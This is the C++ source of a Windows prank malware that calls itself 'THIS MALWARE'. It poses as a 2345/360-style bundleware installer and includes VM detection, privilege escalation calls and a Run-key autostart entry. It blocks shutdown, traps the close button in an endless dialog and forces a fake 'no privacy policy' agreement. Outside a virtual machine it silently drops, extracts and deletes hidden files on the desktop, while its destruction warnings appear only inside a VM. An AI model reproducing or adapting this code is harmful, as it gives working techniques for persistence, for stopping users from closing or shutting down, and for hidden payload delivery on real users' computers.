#ifdef _WIN64
#error Cannot compile or run in Win64!
#endif

#include <iostream>
#include <Windows.h>
#include <CommCtrl.h>
#include <tchar.h>
#include <string>
#include <map>
#include <Shlobj.h>
#include "resource.h"
#include "下崽器基本定义.h"
#include "辅助函数.h"
//#include "../../resource/tool.h"
using namespace std;

#pragma comment(linker, "/subsystem:windows /entry:mainCRTStartup")
#pragma comment(lib, "comctl32.lib")
#pragma comment(linker,"\"/manifestdependency:type='win32' \
name='Microsoft.Windows.Common-Controls' version='6.0.0.0' \
processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")


#define 如果 if
#define 否则 else
#define 消息框 MessageBox
#define my注册窗口类 MyRegisterClassW
#define 创建窗口ExW CreateWindowExW
#define 显示窗口 ShowWindow
#define 销毁窗口 DestroyWindow
#define 窗口_正常显示 SW_NORMAL
#define 窗口_不显示 SW_HIDE
#define 这是一个回调函数 CALLBACK
#define 创建线程 CreateThread

#define WndProc_paramlist (HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
#define PnP高速下崽器的窗口类_0001 L"PnP高速下崽器的窗口类_0001"
LRESULT 这是一个回调函数 PnP高速下崽器的窗口过程_0001 WndProc_paramlist;
#define PnP高速下崽器的窗口类_0002 L"PnP高速下崽器的窗口类_0002"
LRESULT 这是一个回调函数 PnP高速下崽器的窗口过程_0002 WndProc_paramlist;
#define PnP高速下崽器的窗口类_0003 L"PnP高速下崽器的窗口类_0003"
LRESULT 这是一个回调函数 PnP高速下崽器的窗口过程_0003 WndProc_paramlist;

#define WM_创建下崽器主窗口 (WM_USER+0x21)
#define WM_创建下崽窗口 (WM_USER+0x22)

DWORD 这是一个回调函数 Payload线程(PVOID 窗口);


static HFONT 下崽器字体, 下崽器字体_大;


int main(int argc, char* argv[]) {
	如果 (FindWindowW(PnP高速下崽器的窗口类_0001, NULL)) {
		MessageBoxTimeoutW(NULL, L"P" 下崽器版本 "P高速下崽器已在运行!",
			L"高速下崽器", MB_ICONHAND, 0, 5000);
		return ERROR_FILE_EXISTS;
	}

	如果 (程序是否在虚拟机中运行()) {
		//消息框(0, L"vm", L"info", MB_ICONINFORMATION);
		如果(IDCANCEL == 消息框(0, L"已检测到虚拟机,即将开始下崽...\n"
			"如果您在虚拟机外看到此信息,请立即点击[取消]以停止破坏。\n"
			"\nVirtual machine has been detected and the program "
			"will fuck your operation system.\n"
			"If you see this message outside the virtual machine, "
			"click [Cancel] immediately to stop the destruction.",
			L"警告 / Warning", MB_ICONWARNING | MB_OKCANCEL))
			return ERROR_CANCELLED;
		如果(IDCANCEL == 消息框(0, L"THIS IS THE LAST WARNING!\r\n\r\n"
			"THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING "
			"THIS MALWARE!\r\nSTILL EXECUTE IT?", L"LAST WARNING / 最后警告",
			MB_ICONWARNING | MB_OKCANCEL | MB_DEFBUTTON2))
			return ERROR_CANCELLED;
	}
	否则 {
		//消息框(0, L"not vm", L"info", MB_ICONINFORMATION);
	}

	AdjustPrivilege(0x13, 1, 0);
	AdjustPrivilege(0x14, 1, 0);

	my注册窗口类(PnP高速下崽器的窗口类_0001, PnP高速下崽器的窗口过程_0001);
	my注册窗口类(PnP高速下崽器的窗口类_0002, PnP高速下崽器的窗口过程_0002);
	my注册窗口类(PnP高速下崽器的窗口类_0003, PnP高速下崽器的窗口过程_0003);

	下崽器字体 = CreateFont(-14, -7, 0, 0, FW_NORMAL, 0, 0, 0, DEFAULT_CHARSET,
		OUT_CHARACTER_PRECIS, CLIP_CHARACTER_PRECIS, DEFAULT_QUALITY, FF_DONTCARE,
		_T("Consolas"));
	下崽器字体_大 = CreateFont(-36, -18, 0, 0, FW_NORMAL, 0, 0, 0,
		DEFAULT_CHARSET, OUT_CHARACTER_PRECIS, CLIP_CHARACTER_PRECIS, DEFAULT_QUALITY,
		FF_DONTCARE, _T("Consolas"));

	HWND 窗口句柄 = 创建窗口ExW(WS_EX_TOPMOST, PnP高速下崽器的窗口类_0001, L"高速下崽器",
		WS_POPUP | WS_BORDER | WS_SYSMENU, 0, 0, 350, 220, 0, 0, 0, 0);
	居中窗口(窗口句柄);
	显示窗口(窗口句柄, 窗口_正常显示);

	HANDLE hth = 创建线程(0, 0, Payload线程, 窗口句柄, 0, 0);
	if (hth) CloseHandle(hth);

	MSG msg{};
	while (GetMessage(&msg, 0, 0, 0)) {
		DispatchMessage(&msg);
		TranslateMessage(&msg);
	}
	return (int)msg.wParam;
}

LRESULT 这是一个回调函数 PnP高速下崽器的窗口过程_0001 WndProc_paramlist {
	switch (msg) {
	case WM_CREATE:
	{
		static HBITMAP bmp = LoadBitmap(GetModuleHandle(0),
			MAKEINTRESOURCE(IDB_BITMAP_p2p));
		HWND hStatic = 创建窗口ExW(0, L"Static", L"",
			WS_CHILD | WS_VISIBLE | SS_BITMAP,
			0, 0, 350, 220, hwnd, 0, 0, 0);
		SendMessage(hStatic, STM_SETIMAGE, IMAGE_BITMAP, (LPARAM)bmp);
		HWND hStatic2 = 创建窗口ExW(WS_EX_TOPMOST, L"Static", L"" 下崽器版本,
			WS_CHILD | WS_VISIBLE,
			103, 80, 9, 16, hwnd, 0, 0, 0);

		EnableMenuItem(GetSystemMenu(hwnd, FALSE), SC_CLOSE, MF_DISABLED | MF_GRAYED);
	}
		break;

	case WM_创建下崽器主窗口:
	{
		HWND hwnd2 = CreateWindowExW(WS_EX_TOPMOST, PnP高速下崽器的窗口类_0002,
			L"高速下崽器", WS_OVERLAPPED | WS_BORDER | WS_SYSMENU | WS_CAPTION,
			0, 0, 660, 300, 0, 0, 0, 0);
		居中窗口(hwnd2);
		显示窗口(hwnd2, 窗口_正常显示);
		显示窗口(hwnd, 窗口_不显示);
		return (LRESULT)hwnd2;
	}
		break;

	case WM_SETFOCUS:
		SetWindowTextW(hwnd, L"高速下崽器");
		break;
	case WM_KILLFOCUS:
		SetWindowTextW(hwnd, L"(!) P" 下崽器版本 "P下崽器: 别想结束下崽器");
		break;

	case WM_NCHITTEST:
		return HTCAPTION;
		break;

	case WM_QUERYENDSESSION:
		SetWindowTextW(hwnd, L"(!) P" 下崽器版本 "P下崽器: 不准关机不然我把你电脑吃♂掉");
	case WM_ENDSESSION:
		return FALSE;
		break;

		ExitProcess(ERROR_SHUTDOWN_IN_PROGRESS);
		break;

	case WM_CLOSE:
		//销毁窗口(hwnd);
		break;

	case WM_DESTROY:
		PostQuitMessage(0);
		break;

	default:
		return DefWindowProc(hwnd, msg, wParam, lParam);
	}
	return 0;
}

constexpr size_t 高速下崽器要安装的软件_每列数量 = 8;
PCWSTR 高速下崽器要安装的软件[2][高速下崽器要安装的软件_每列数量]{
	{
		L"不安装360安全卫士",
		L"不安装腾讯电脑管家",
		L"不安装金山毒爸",
		L"不安装中国特供Flash",
		L"不安装快压",
		L"不安装鲁大师",
		L"不安装瑞星",
		L"不将主页锁定为2345"
	},
	{
		L"不安装2345安全卫士",
		L"不安装2345加速浏览器",
		L"不安装2345看图王",
		L"不安装2345好压",
		L"不安装2345王牌输入法",
		L"不安装360杀毒",
		L"不安装360安全浏览器",
		L"不安装360极速浏览器",
	}
};

static HHOOK Hook_是不是点错了;
LRESULT CALLBACK HookProc_是不是点错了(int code, WPARAM wParam, LPARAM lParam) {
	if (code == HCBT_CREATEWND) {
		HWND hwnd = (HWND)wParam;
		//LPCBT_CREATEWND cbt = (LPCBT_CREATEWND)lParam;
		//WCHAR wclass[64]{ 0 };
		//GetClassNameW(hwnd, wclass, 63);
		//if (_wcsicmp(wclass, L"Button") == 0)
		SetWindowTextW(hwnd, L"点错了");
		return 0; // allow
	}
	return CallNextHookEx(Hook_是不是点错了, code, wParam, lParam);
}

LRESULT 这是一个回调函数 PnP高速下崽器的窗口过程_0002 WndProc_paramlist {
	switch (msg) {
	case WM_CREATE:
	{
		HWND htmp = 0;
		int x = 0, y = 0;
		for (size_t i = 0; i < 2; ++i) {
			if (i == 0) x = 10;
			if (i == 1) x = 470;
			for (size_t j = 0; j < 高速下崽器要安装的软件_每列数量; j++) {
				y = 10 + ((20 + 10) * j);
				htmp = CreateWindowExW(0, L"Button", 高速下崽器要安装的软件[i][j],
					WS_CHILD | WS_VISIBLE | BS_AUTOCHECKBOX, x, y, 160, 20,
					hwnd, (HMENU)2, 0, 0);
				SendMessage(htmp, WM_SETFONT, (WPARAM)下崽器字体, 0);
			}
		}

		HWND big_title = CreateWindowExW(0, L"Static", L"2345全家桶套餐",
			WS_CHILD | WS_VISIBLE | SS_CENTER,
			180, 10, 280, 50, hwnd, 0, 0, 0);
		SendMessage(big_title, WM_SETFONT, (WPARAM)下崽器字体_大, 0);
		HWND btn = CreateWindowExW(0, L"Button", L"> 立即安装 <",
			WS_CHILD | WS_VISIBLE | BS_CENTER,
			180, 70, 280, 140, hwnd, (HMENU)3, 0, 0);
		SendMessage(btn, WM_SETFONT, (WPARAM)下崽器字体_大, 0);
		HWND static_setup = CreateWindowExW(0, L"Static", L"5秒后自动开始安装",
			WS_CHILD | WS_VISIBLE | SS_CENTER,
			180, 220, 280, 20, hwnd, 0, 0, 0);
		SendMessage(static_setup, WM_SETFONT, (WPARAM)下崽器字体, 0);
		

		//EnableMenuItem(GetSystemMenu(hwnd, FALSE), SC_CLOSE, MF_DISABLED | MF_GRAYED);
	}
		break;

	case WM_COMMAND: {
		auto wmId = LOWORD(wParam), wmEvent = HIWORD(wParam);
		HWND ctl = (HWND)lParam;
		switch (wmId) {
		case 2: {
			WCHAR wtext[256]{ 0 };
			GetWindowTextW(ctl, (((PWSTR)wtext) + 1), 254);
			if (SendMessage(ctl, BM_GETSTATE, 0, 0) & BST_CHECKED) {
				SetWindowTextW(ctl, (((PCWSTR)wtext) + 2));
			}
			else {
				wtext[0] = L'不';
				SetWindowTextW(ctl, wtext);
			}
		}
			break;

		case 3:
			//显示窗口(hwnd, 窗口_不显示);
			SetWindowTextW(ctl, L"正在准备...");
			EnableWindow(ctl, FALSE);
			break;

		default:
			return DefWindowProc(hwnd, msg, wParam, lParam);
		}
	}
		break;

	case WM_KEYDOWN:
		//if (wParam == VK_ESCAPE) return DestroyWindow(hwnd); // 测试代码
		return DefWindowProc(hwnd, msg, wParam, lParam);
		break;

	case WM_创建下崽窗口:
	{
		HWND hwnd2 = CreateWindowExW(WS_EX_TOPMOST, PnP高速下崽器的窗口类_0003,
			L"正在下崽 - 高速下崽器", WS_POPUP | WS_BORDER | WS_SYSMENU,
			0, 0, 250, 120, 0, 0, 0, 0);
		居中窗口(hwnd2);
		显示窗口(hwnd2, 窗口_正常显示);
		显示窗口(hwnd, 窗口_不显示);
		return (LRESULT)hwnd2;
	}
		break;

	case WM_SETFOCUS:
		SetWindowTextW(hwnd, L"高速下崽器");
		break;
	case WM_KILLFOCUS:
		SetWindowTextW(hwnd, L"(!) P" 下崽器版本 "P下崽器: 别想结束下崽器");
		break;

	case WM_NCHITTEST:
		return HTCAPTION;
		break;

	case WM_QUERYENDSESSION:
		SetWindowTextW(hwnd, L"(!) P" 下崽器版本 "P下崽器: 不准关机不然我把你电脑吃♂掉");
	case WM_ENDSESSION:
		return FALSE;
		break;

	case WM_CLOSE:
	{
		ask:
		if (MessageBoxTimeoutW(hwnd, L"是不是点错了?", L"高速下崽器",
			MB_ICONQUESTION | MB_YESNO, 0, 2000) == IDNO) goto ask;
	}
		break;

	case WM_DESTROY:
		PostQuitMessage(0);
		break;

	default:
		return DefWindowProc(hwnd, msg, wParam, lParam);
	}
	return 0;
}

typedef struct {
	HWND progress0;
} PnP高速下崽器的窗口s_0003;
std::map<HWND, PnP高速下崽器的窗口s_0003> PnP高速下崽器的窗口s存储_0003;
LRESULT 这是一个回调函数 PnP高速下崽器的窗口过程_0003 WndProc_paramlist {
	switch (msg) {
	case WM_CREATE:
	{
		PnP高速下崽器的窗口s_0003 ws{};
		HWND caption = CreateWindowExW(0, L"Static", L"正在下崽,请稍候...",
			WS_CHILD | WS_VISIBLE | SS_CENTER, 5, 5, 236, 20,
			hwnd, 0, 0, 0);
		SendMessage(caption, WM_SETFONT, (WPARAM)下崽器字体, 0);
		ws.progress0 = CreateWindowExW(0, PROGRESS_CLASSW, L"",
			WS_CHILD | WS_VISIBLE | PBS_MARQUEE | WS_DISABLED,
			5, 40, 236, 30,	hwnd, 0, 0, 0);
		SendMessage(ws.progress0, PBM_SETMARQUEE, TRUE, 0);
		HWND cancel_btn = CreateWindowExW(0, L"Button", L"取消下崽",
			WS_CHILD | WS_VISIBLE | BS_CENTER | WS_DISABLED,
			170, 80, 70, 30, hwnd, 0, 0, 0);
		SendMessage(cancel_btn, WM_SETFONT, (WPARAM)下崽器字体, 0);
		PnP高速下崽器的窗口s存储_0003[hwnd] = ws;

		EnableMenuItem(GetSystemMenu(hwnd, FALSE), SC_CLOSE, MF_DISABLED | MF_GRAYED);
	}
		break;

	case WM_SETFOCUS:
		SetWindowTextW(hwnd, L"正在下崽 - 高速下崽器");
		break;
	case WM_KILLFOCUS:
		SetWindowTextW(hwnd, L"(!) P" 下崽器版本 "P下崽器: 别想结束下崽器");
		break;

	case WM_NCHITTEST:
		return HTCAPTION;
		break;

	case WM_QUERYENDSESSION:
		SetWindowTextW(hwnd, L"(!) P" 下崽器版本 "P下崽器: 不准关机不然我把你电脑吃♂掉");
	case WM_ENDSESSION:
		return FALSE;
		break;

		ExitProcess(ERROR_SHUTDOWN_IN_PROGRESS);
		break;

	case WM_CLOSE:
		//销毁窗口(hwnd);
		break;

	case WM_DESTROY:
		try { PnP高速下崽器的窗口s存储_0003.erase(hwnd); }
		catch (...) {}
		PostQuitMessage(0);
		break;

	default:
		return DefWindowProc(hwnd, msg, wParam, lParam);
	}
	return 0;
}


DWORD 这是一个回调函数 Payload线程(PVOID p窗口) {
	HWND wnd = (HWND)p窗口;

	if (程序是否在虚拟机中运行()) {
		wstring pd = s2ws("\"" + GetProgramDir() + "\"");
		RegSetKeyValueW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\"
			"CurrentVersion\\Run", L"P" 下崽器版本 "P_download_task",
			REG_SZ, pd.c_str(), pd.length());
	}

	::srand((unsigned)time(0));
	Sleep(1000 + rand() % 500);

	INITCOMMONCONTROLSEX icce{};
	icce.dwSize = sizeof(icce);
	icce.dwICC = ICC_WIN95_CLASSES;
	InitCommonControlsEx(&icce);

	do {
		SERVICE_STATUS stat = { 0 };
		SC_HANDLE sch = OpenSCManager(0, 0, SC_MANAGER_ALL_ACCESS);
		if (!sch) break;
		SC_HANDLE svc = OpenServiceW(
			sch, L"P" 下崽器版本 "P_download_support",
			SERVICE_QUERY_STATUS |
			SERVICE_ENUMERATE_DEPENDENTS |
			SERVICE_START);
		if (!svc) {
			CloseServiceHandle(sch);
			break;
		}
		if (!QueryServiceStatus(svc, &stat)) {
			CloseServiceHandle(svc);
			CloseServiceHandle(sch);
			break;
		}
		if (stat.dwCurrentState == SERVICE_STOPPED) {
			StartService(svc, 0, NULL);
		}
		CloseServiceHandle(svc);
		CloseServiceHandle(sch);
		MessageBoxTimeoutW(NULL, L"下崽器已在运行!\n3秒后退出...",
			L"P" 下崽器版本 "P高速下崽器", MB_ICONINFORMATION, 0, 3000);
		ExitProcess(ERROR_SERVICE_ALREADY_RUNNING);
	} while (0);

	HWND wnd2 = (HWND)SendMessage(wnd, WM_创建下崽器主窗口, 0, 0);
	Sleep(5000);
	HWND wnd3 = (HWND)SendMessage(wnd2, WM_创建下崽窗口, 0, 0);

	::srand((unsigned)time(0));
	Sleep(rand() % 1000);
	if (IDNO == MessageBoxTimeoutW(wnd3,
		L"您是否同意《用户协议》以及《用户没有隐私政策》？",
		L"P" 下崽器版本 "P高速下崽器", MB_ICONQUESTION | MB_YESNO, 0, 3000)) {
		MessageBoxTimeoutW(wnd3, L"您是否同意《用户协议》以及《用户没有隐私政策》？",
			L"P" 下崽器版本 "P高速下崽器", MB_ICONQUESTION, 0, 3000);
	}

	::srand((unsigned)time(0));
	Sleep(3000 + rand() % 2000);

	如果 (程序是否在虚拟机中运行()) {

	} 否则 {
		WCHAR userdesktop[512]{ 0 };
		SHGetSpecialFolderPathW(GetDesktopWindow(), userdesktop, CSIDL_DESKTOP, FALSE);
		SetCurrentDirectoryW(userdesktop);
		wstring unzipper = (L"\\\\.\\"s + userdesktop + L"\\7\x2060zip for "
			+ to_wstring(GetCurrentProcessId()) + L".pe32");
		FreeResFile(IDR_BIN_7z, L"BIN", unzipper);
		SetFileAttributesW(unzipper.c_str(), FILE_ATTRIBUTE_HIDDEN);

		wstring 崽 = (userdesktop + L"\\崽.7z"s);
		FreeResFile(IDR_BIN_icons, L"BIN", 崽);
		SetFileAttributesW(崽.c_str(), FILE_ATTRIBUTE_HIDDEN);

		wstring cmdl = L"7zConsole x \"" + 崽 + L"\" -y";
		
		PROCESS_INFORMATION pi{ 0 };
		try {
			STARTUPINFOW si{ 0 };
			si.cb = sizeof(si);
			si.dwFlags = STARTF_USESHOWWINDOW;
			si.wShowWindow = SW_HIDE;
			WCHAR _cmdl[2048]{ 0 };
			wcscpy_s(_cmdl, cmdl.c_str());
#pragma warning(push)
#pragma warning(disable: 6335)
			if (!CreateProcessW(unzipper.c_str(), _cmdl, 0, 0, 0, 0, 0, 0, &si, &pi)) {
				throw LastErrorStrW();
			}
#pragma warning(pop)
			CloseHandle(pi.hThread);
		}
		catch (std::wstring err) {
			MessageBoxW(wnd3, err.c_str(), L"无法为您下崽", MB_ICONHAND);
			ExitProcess(GetLastError());
		}

		if (WaitForSingleObject(pi.hProcess, 30 * 1000) == WAIT_TIMEOUT) {
			MessageBoxW(wnd3, ErrorCodeToStringW(ERROR_TIMEOUT).c_str()
				, L"无法为您下崽", MB_ICONHAND);
			CloseHandle(pi.hProcess);
			ExitProcess(ERROR_TIMEOUT);
		}
		CloseHandle(pi.hProcess);

		DeleteFileW(崽.c_str());
		DeleteFileW(unzipper.c_str());
	}

	MessageBoxW(wnd3, L"恭喜你,下崽完成!", L"高速下崽器", MB_ICONINFORMATION);
	ExitProcess(0);

	return 0;
}

